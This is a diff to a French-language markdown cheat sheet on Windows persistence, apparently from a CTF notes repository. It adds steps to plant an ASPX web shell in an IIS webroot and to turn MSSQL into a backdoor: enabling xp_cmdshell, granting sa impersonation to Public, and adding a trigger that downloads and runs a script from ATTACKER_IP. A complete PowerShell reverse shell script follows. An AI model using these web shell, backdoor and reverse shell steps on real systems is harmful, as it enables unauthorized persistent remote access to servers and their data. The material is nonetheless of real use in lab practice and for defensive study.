@@ -255,3 +255,81 @@ HKCU\Environment
 
 <br>
 <br>
+## Web Shells
+
+Si Serveur IIS, utiliser ce <a href="https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx">shell</a> et le mettre dans `C:\inetpub\wwwroo` (répertoire par défaut).
+
+```
+move shell.aspx C:\inetpub\wwwroot\
+icacls shell.aspx /grant Everyone:F
+```
+Y accéder
+```
+http://<Domain>/shell.aspx
+```
+<br>
+<br>
+
+## MSSQL as a Backdoor
+
+Ouvrir `Microsoft SQL Server Management Studio 18`
+<br>
+![image](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/assets/97956863/5d12c83f-eebb-4369-b42f-d1f02c5b2f15)
+
+```
+sp_configure 'Show Advanced Options',1;
+RECONFIGURE;
+GO
+
+sp_configure 'xp_cmdshell',1;
+RECONFIGURE;
+GO
+```
+
+Appuyer sur Execute
+
+```
+USE master
+
+GRANT IMPERSONATE ON LOGIN::sa to [Public];
+```
+
+Appuyer sur Execute
+
+```
+USE HRDB
+```
+
+Appuyer sur Execute
+
+```
+CREATE TRIGGER [sql_backdoor]
+ON HRDB.dbo.Employees 
+FOR INSERT AS
+
+EXECUTE AS LOGIN = 'sa'
+EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';
+```
+
+Appuyer sur Execute
+
+### Script evilscript.ps1
+
+```
+$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4454);
+
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+    $sendback = (iex $data 2>&1 | Out-String );
+    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush()
+};
+
+$client.Close()
+```
+
+Il faut donc ouvrir 2 terminaux, un avec un serveur `python3 -m http.server` et un listener
